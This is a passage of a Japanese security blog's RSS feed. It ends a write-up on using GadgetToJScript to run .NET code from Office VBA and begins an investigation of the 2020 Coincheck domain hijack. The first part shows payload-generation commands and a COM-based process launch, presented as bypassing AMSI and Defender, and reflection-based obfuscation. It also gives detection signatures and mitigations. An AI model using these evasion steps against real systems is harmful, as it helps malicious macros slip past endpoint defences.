&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Program&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;n&#34;&gt;MessageBox&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Hello, World!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ここで大事なのはパブリッククラスであること、クラスのコンストラクタを実装することです。&lt;/p&gt;
&lt;p&gt;ファイルを hello.cs として保存します。&lt;/p&gt;
&lt;h3 id=&#34;g2js-in-vbscript&#34;&gt;G2JS in VBScript&lt;/h3&gt;
&lt;p&gt;インプットファイルとして hello.cs を指定して G2J を実行し、vbs ファイルを生成します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; GadgetToJScript.exe -b -w vbs -c hello.cs -o test -d System.dll -d System.Windows.Forms.dll
[+]: Generating the vbs payload
[+]: First stage gadget generation done.
[+]: Compiling your .NET code located at:hello.cs
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: test.vbs
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;test.vbs が生成されているので、ダブルクリックすると、メッセージボックスが表示されます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/g2j_hello.png&#34; alt=&#34;g2j_hello&#34;&gt;
&lt;/p&gt;
&lt;h3 id=&#34;g2js-in-vba&#34;&gt;G2JS in VBA&lt;/h3&gt;
&lt;p&gt;次は VBA で実行してみます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; GadgetToJScript.exe -b -w vba -c hello.cs -o test -d System.dll -d System.Windows.Forms.dll
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;
  &lt;img src=&#34;images/g2js_vba_hello.png&#34; alt=&#34;g2js_vba_hello&#34;&gt;
&lt;/p&gt;
&lt;p&gt;Office VBA 上でも .NET プログラムを実行することができました。&lt;/p&gt;
&lt;p&gt;2020/10 現時点においては .NET プログラムが読み込まれるまでの処理で AMSI トリガーとなるメソッドが含まれていないため、G2JS を使った侵害は AMSI バイパスとなりえます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/g2js_amsitrigger.png&#34; alt=&#34;g2js_amsitrigger&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;図の通り、G2JS ではデシリアライズ後に最終的に Assembly.Load によって .NET プログラムが読み込まれるため、clr.dll による AmsiScanBuffer がコールされます。そのため RedTeaming 時は別途 .NET プログラム上で難読化などの検知回避が必要です。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;g2js--com-オブジェクトを利用した別プロセスの起動--enable-windows-defener&#34;&gt;G2JS + COM オブジェクトを利用した別プロセスの起動  (Enable Windows Defener)&lt;/h3&gt;
&lt;p&gt;G2JS を使えばどんな .NET プログラムも実行することができますが、今回は VBA 単体だと AMSI + Windows Defender によって検知されてしまう、COM オブジェクトを使ったプロセス生成にチャレンジしてみます。&lt;/p&gt;
&lt;p&gt;下記の C# コードを用いて、G2JS でスクリプトを生成します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(..&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;snip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;com&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetTypeFromCLSID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Guid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Parse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;9BA05972-F6A8-11CF-A442-00A0C90A8F39&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;dynamic&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Activator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Application&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ShellExecute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;notepad.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;open&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(..&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;snip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ただし生成したスクリプトをそのまま動かすと Windows Defender によって検知されます。そこで独自にカスタマイズした難読化ツールで難読化し、実行してみます。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;難読化ツールについては詳細を控えます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;
  &lt;img src=&#34;images/g2js_com_evation.png&#34; alt=&#34;g2js_com_evation&#34;&gt;
&lt;/p&gt;
&lt;p&gt;マクロを有効にすると、.NET プログラムが実行され、親プロセスが explorer.exe であるメモ帳が起動しました。Office プロセスのメモリ上に .NET プログラムが読み込まれていることが確認できます。&lt;/p&gt;
&lt;p&gt;以上のように Windows Defender および クラウド保護を有効にした状態、かつ Exploit Protection による子プロセス不許可が有効な状態であっても、全てをバイパスしてプロセスを生成することが可能です。&lt;/p&gt;
&lt;h1 id=&#34;対策&#34;&gt;対策&lt;/h1&gt;
&lt;p&gt;G2JS のデシリアライズ手法を用いて .NET プログラムを読み込むことで、Office プロセス内で VBA の領域を離れて侵害が可能であることを実証しました。&lt;/p&gt;
&lt;p&gt;この手法はあくまで VBA の仕様内で実現されるため、&lt;strong&gt;マクロを無効にする以外の有効な防止策はありません&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;なお COM オブジェクト経由で .NET を利用している関係上、VBA を動かしているプロセス(今回は EXCEL.EXE)は clr.dll が呼ばれます。これにより ProcessHacker でプロセスを確認すると .NET 関連のタブが表示されるようになりますが、そもそも VBA で .NET Framework を利用するシーンはたくさんあるため、これは何のインジケータにもなりません。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/g2js_vba_excel_ph.png&#34; alt=&#34;g2js_vba_excel_ph&#34;&gt;
&lt;/p&gt;
&lt;h2 id=&#34;検知&#34;&gt;検知&lt;/h2&gt;
&lt;p&gt;ただし G2JS にも弱点は存在します。それは、デシリアライズするために必須なメソッドが特徴的である点です。&lt;/p&gt;
&lt;p&gt;.NET プログラムをデシリアライズするために必須なコードは以下です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;actCtx.ManifestText = manifest&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;COM オブジェクトを登録せずに .NET オブジェクトを利用するために必須&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;stm_1.WriteByte&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;BinaryFormatter.Deserialize() の引数は Stream クラスが必要であり、MemoryStream にバイト配列を書き込むために必須&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fmt_1.Deserialize_2(stm_1)&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;.NET プログラムのデシリアライズに必須&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;これらのメソッド呼び出しは PowerShell のように簡単に難読化できるものではありません。そのため、文字列や変数名のみの簡易的な難読化であれば、以下のようにメソッド名が残ります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pmfrxyltsrzjjj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ManifestText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;djsktksnmbak&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;lzadypxlktswisq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteByte&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gmjxujigkjmudfmhkfzb&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xaobbncueaofydar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Deserialize_2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lzadypxlktswisq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;単体で利用した場合にはともかく、1つの VBA 内でこれら 3 つが同時に利用されるパターンは .NET プログラムのデシリアライズを意図していると判断できるため、検知に有用と考えます。&lt;/p&gt;
&lt;p&gt;また、Microsoft がこれらのメソッド名について AMSI トリガーを実装してしまえば、攻撃者側が以下のリフレクション手法を使っても動的解析で検知できる可能性が高いと考えられます。&lt;/p&gt;
&lt;h3 id=&#34;リフレクションによる難読化について&#34;&gt;リフレクションによる難読化について&lt;/h3&gt;
&lt;p&gt;VBA にも貧弱ながらリフレクションが存在し、より高度な難読化が可能です。 &lt;a href=&#34;https://docs.microsoft.com/ja-jp/office/vba/language/reference/user-interface-help/callbyname-function&#34;&gt;CallByName&lt;/a&gt; です。例えば &lt;code&gt;fmt_1.Deserialize_2(stm_1)&lt;/code&gt; についてはリフレクションを用いることで以下のように記載可能です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;o1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CallByName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fmt_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Deserialize_2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VbMethod&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stm_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;このコードを文字列を別変数に代入し難読化すると、以下になります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cuzmicydpdcpnjnkcl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CallByName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ygftmlcabsflnu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wsxfcgrolbfpixsfcosr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;idasmadwe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;htzojnmestlccsdkpcns&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;このとおり、&lt;code&gt;Deserialize_2&lt;/code&gt; の文字列がなくなりました。動的解析を行えば最終的に復元されますが、本メソッド名は現時点では AMSI トリガーに含まれないため AMSI プロバイダに渡されず、検知されません。&lt;/p&gt;
&lt;h4 id=&#34;callbyname-の悪性度&#34;&gt;CallByName の悪性度&lt;/h4&gt;
&lt;p&gt;リフレクションを用いることで静的解析での検知は難しくなりました。ただしこの手法だと、リフレクション特有のメソッド &lt;code&gt;CallByName&lt;/code&gt; がコード中に現れます。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://jglobal.jst.go.jp/detail?JGLOBAL_ID=201802212058348458&#34;&gt;三浦氏らの論文&lt;/a&gt;によると、CallByName の悪性マクロでの出現率は 51.3% に対して、良性マクロでの出現率は 0.1% とされます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/benign_macro_point.png&#34; alt=&#34;benign_macro_point&#34;&gt;
&lt;/p&gt;
&lt;p&gt;このことから、リフレクションによる難読化を使われてしまうとコードの静的解析による G2JS 特有の検知を行うことはできませんが、いくつかの検知手法と組み合わせることで汎用的に悪性マクロを検知できるものと考えます。&lt;/p&gt;
&lt;h1 id=&#34;まとめ&#34;&gt;まとめ&lt;/h1&gt;
&lt;p&gt;任意の .NET プログラムをデシリアライズして読み込む原理と、それを利用して Windows Script Host (WSH) 上で読み込む GadgetToJScript の実装を解説しました。&lt;/p&gt;
&lt;p&gt;D2JS の対策とアンチウイルスベンダーの検知技術の向上により現在の Red Teming ではそもそも VBA をあまり使わない方法にシフトしつつある気もしますが、G2JS を有効に使うアクターはこれからも存在し続けるはずです。この記事が助けになれば幸いです。&lt;/p&gt;
&lt;h1 id=&#34;reference&#34;&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Office VBA + AMSI: Parting the veil on malicious macros
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/&#34;&gt;https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Advanced TTPs – DotNetToJScript (Part 1)
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.whiteoaksecurity.com/2020-1-16-advanced-ttps-dotnettojscript-part-1/&#34;&gt;https://www.whiteoaksecurity.com/2020-1-16-advanced-ttps-dotnettojscript-part-1/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GadgetToJScript
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/med0x2e/GadgetToJScript&#34;&gt;https://github.com/med0x2e/GadgetToJScript&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Exploiting .NET Managed DCOM
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://googleprojectzero.blogspot.com/2017/04/&#34;&gt;https://googleprojectzero.blogspot.com/2017/04/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Re-Animating ActivitySurrogateSelector
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://silentbreaksecurity.com/re-animating-activitysurrogateselector/&#34;&gt;https://silentbreaksecurity.com/re-animating-activitysurrogateselector/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ysoserial.net
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/pwntester/ysoserial.net&#34;&gt;https://github.com/pwntester/ysoserial.net&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;New .NET deserialization gadget for compact payload. When size matters
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282&#34;&gt;https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bag-of-wordsを用いた悪性マクロの検知手法の提案
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://jglobal.jst.go.jp/detail?JGLOBAL_ID=201802212058348458&#34;&gt;https://jglobal.jst.go.jp/detail?JGLOBAL_ID=201802212058348458&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AMSI-Bypass
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/synacktiv/AMSI-Bypass&#34;&gt;https://github.com/synacktiv/AMSI-Bypass&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>GadgetToJScript を利用した Office VBA のAMSI バイパスと原理</title>
        <link>https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>コインチェックのドメインハイジャックの手法を調査した</title>
      <link>https://www.shutingrz.com/post/dig-coincheck/</link>
      <pubDate>Thu, 04 Jun 2020 20:00:00 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/dig-coincheck/</guid>
      <description>&lt;p&gt;しゅーとです。&lt;/p&gt;
&lt;p&gt;コインチェックは 6月2日 、ドメインレジストラである「お名前.com」の管理アカウントに不正にアクセスされ、ドメイン登録情報が変更されたこと、またそれによって第三者によるメールの不正取得が行われたと発表しました。&lt;/p&gt;
&lt;p&gt;プレスリリース(第一報)は以下です。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://corporate.coincheck.com/2020/06/02/97.html&#34;&gt;当社利用のドメイン登録サービスにおける不正アクセスについて（第一報）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;攻撃を受けた時刻が 5/31 0:05 で、検知時刻が 6/1 12:00 と攻撃に気付くまでの時間は1日であり、また対応完了まで2日足らずとのことで、検知・対応は非常に迅速だったと思います。&lt;/p&gt;
&lt;p&gt;今後第二報で詳細な内容が発表されると思いますが、プレスリリースから攻撃者がどのようにメールの不正取得を行ったのか、インターネット上の情報を用いて調査してみました。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ドメインハイジャックをされている関係上、メール以外にもSSL証明書の不正取得や偽Webサーバによる盗聴などの被害も考えられます。&lt;br&gt;
ただプレスリリースに記載していないことを推測で語るのもよくないため、今回はプレスリリースで触れられているメールの不正取得のみを対象とします。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;※プレスリリース、およびインターネット上の情報からの推測であることを念頭においてください。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;ドメインハイジャックの原因について-0604-追記&#34;&gt;ドメインハイジャックの原因について (06/04 追記)&lt;/h2&gt;
&lt;p&gt;6月4日、コインチェックが最終報としてプレスリリースを出しました。(一部引用)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;「お名前.com」のドメインやサーバーを管理する「お名前.com Navi」における通信を改ざんできる不具合を利用し、悪意のある第三者が不正にメールアドレスの変更を実施。変更したメールアドレスを使用し当社アカウントのパスワードを変更後、ログインし、ドメイン登録情報を書き換えたことが判明しました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://corporate.coincheck.com/2020/06/04/98.html&#34;&gt;当社利用のドメイン登録サービス「お名前.com」で発生した事象について（最終報告）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;引用のとおり、攻撃者は&lt;a href=&#34;https://www.onamae.com/news/domain/20200603_1/&#34;&gt;「お名前.com Navi」に存在した脆弱性&lt;/a&gt;を用いてコインチェックの「お名前.com」アカウントを奪取しドメインハイジャックを行ったようです。&lt;br&gt;
なお「お名前.com Navi」の脆弱性を起因としたドメインハイジャックは、コインチェックだけではなく、bitbank でも発生したことが&lt;a href=&#34;https://blog.bitbank.cc/20200604/&#34;&gt;明らか&lt;/a&gt;になっています。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(追記終わり)&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;不正調査開始&#34;&gt;不正調査開始&lt;/h1&gt;
&lt;h2 id=&#34;whoisの確認&#34;&gt;whoisの確認&lt;/h2&gt;
&lt;p&gt;プレスリリースで、ドメイン登録情報が変更されたと記載があります。whoisにはネームサーバの情報が記載されているため、whois情報を調べます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ whois coincheck.com
   Domain Name: COINCHECK.COM
   Registry Domain ID: 80933535_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.discount-domain.com
   Registrar URL: http://gmo.jp
   Updated Date: 2020-06-01T11:52:53Z
   Creation Date: 2001-12-10T11:05:42Z
   Registry Expiry Date: 2020-12-10T11:05:42Z
   Registrar: GMO Internet, Inc. d/b/a Onamae.com
   Registrar IANA ID: 49
   Registrar Abuse Contact Email: abuse@gmo.jp
   Registrar Abuse Contact Phone: +81.337709199
   Domain Status: ok https://icann.org/epp#ok
   Name Server: NS-1515.AWSDNS-61.ORG
   Name Server: NS-1985.AWSDNS-56.CO.UK
   Name Server: NS-405.AWSDNS-50.COM
   Name Server: NS-650.AWSDNS-17.NET
(snip)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;この結果から、いくつかの情報がわかります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ドメイン登録情報の最終更新日(Updated Date)
&lt;ul&gt;
&lt;li&gt;2020-06-01T11:52:53Z&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ネームサーバ
&lt;ul&gt;
&lt;li&gt;NS-1515.AWSDNS-61.ORG&lt;/li&gt;
&lt;li&gt;NS-1985.AWSDNS-56.CO.UK&lt;/li&gt;
&lt;li&gt;NS-405.AWSDNS-50.COM&lt;/li&gt;
&lt;li&gt;NS-650.AWSDNS-17.NET&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ただ、私が調査をした6/3は、攻撃に対する対応が完了した6/2以降であるため、現時点のwhois情報だけでは攻撃者の攻撃手法などを把握することは出来ません。&lt;/p&gt;
&lt;p&gt;まずは順に情報を見つけていきましょう。&lt;/p&gt;
&lt;h2 id=&#34;登録情報が正しいものに修正された時刻&#34;&gt;登録情報が正しいものに修正された時刻&lt;/h2&gt;
&lt;p&gt;ネームサーバの修正時刻は、第一報に記載があります。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2020年6月1日20時52分頃にドメイン登録情報の修正を実施しており、現時点でお客様の資産に影響はございません。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;また、上記のwhoisを確認すると、Updated Dateから確かにその時間であるとわかります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Updated Date: 2020-06-01T20:52:53Z
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;登録情報が侵害されたときの情報&#34;&gt;登録情報が侵害されたときの情報&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://whoisrequest.com/history/&#34;&gt;Domain history checker&lt;/a&gt;を用いることで、coincheck.comの過去のwhois情報を取得することが出来ました。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./whois_history.png&#34; alt=&#34;whois_history&#34;&gt;
&lt;/p&gt;
&lt;p&gt;細かい時刻はわかりませんが、&lt;strong&gt;5/31 にネームサーバが変更されています&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;具体的にはAWSのネームサーバが削除され、代わりに正しいネームサーバの名前に似せた不正なネームサーバが登録されていることがわかります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ns-1515.awsdns-&lt;strong&gt;0&lt;/strong&gt;61[.]org&lt;/li&gt;
&lt;li&gt;ns-1985.awsdns-&lt;strong&gt;0&lt;/strong&gt;56[.]co.uk&lt;/li&gt;
&lt;/ul&gt;
